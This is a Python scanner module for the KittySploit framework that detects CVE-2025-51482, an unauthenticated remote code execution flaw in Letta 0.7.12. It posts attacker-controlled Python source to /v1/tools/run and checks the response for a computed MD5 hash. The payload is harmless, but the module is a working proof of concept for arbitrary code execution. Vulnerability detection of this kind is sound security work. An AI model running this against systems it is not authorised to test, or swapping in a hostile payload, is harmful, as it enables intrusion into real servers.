#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Letta 0.7.12 - Remote Code Execution"""

import hashlib
import json

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        "name": "Letta 0.7.12 - Remote Code Execution",
        "description": "Unauthenticated RCE via POST /v1/tools/run executing attacker tool source_code.",
        "author": ["KittySploit Team"],
        "severity": "high",
        "cve": "CVE-2025-51482",
        "tags": ["web", "scanner", "cve", "cve2025", "vuln", "letta", "rce", "vkev"],
        "agent": {
            "risk": "active",
            "effects": ["network_probe"],
            "expected_requests": 1,
            "reversible": True,
            "approval_required": False,
            "produces": ["tech_hints", "risk_signals", "endpoints"],
            "cost": 1.0,
            "noise": 0.2,
            "value": 1.0,
        },
        "references": [
            "https://www.gecko.security/blog/cve-2025-51482",
            "https://github.com/letta-ai/letta/pull/2630",
            "https://nvd.nist.gov/vuln/detail/CVE-2025-51482",
        ],
    }

    def run(self):
        num = "999999999"
        expected = hashlib.md5(num.encode()).hexdigest()
        payload = {
            "name": "kittysploit",
            "args": {},
            "json_schema": {"type": "object", "properties": {}},
            "source_code": (
                "def kittysploit():\n"
                "    import hashlib\n"
                f"    data='{num}'.encode('utf-8')\n"
                "    return ''+hashlib.md5(data).hexdigest()"
            ),
        }
        r = self.http_request(
            method="POST",
            path="/v1/tools/run",
            headers={"Content-Type": "application/json"},
            data=json.dumps(payload),
            allow_redirects=False,
        )
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        ctype = (r.headers.get("Content-Type") or r.headers.get("content-type") or "").lower()
        if "application/json" not in ctype:
            return False
        if expected not in body or 'tool_return":' not in body.replace(" ", ""):
            if expected not in body or "tool_return" not in body:
                return False
        self.set_info(
            severity="high",
            cve="CVE-2025-51482",
            reason="Letta /v1/tools/run executed attacker-controlled source_code",
            path="/v1/tools/run",
            confidence="high",
        )
        return True
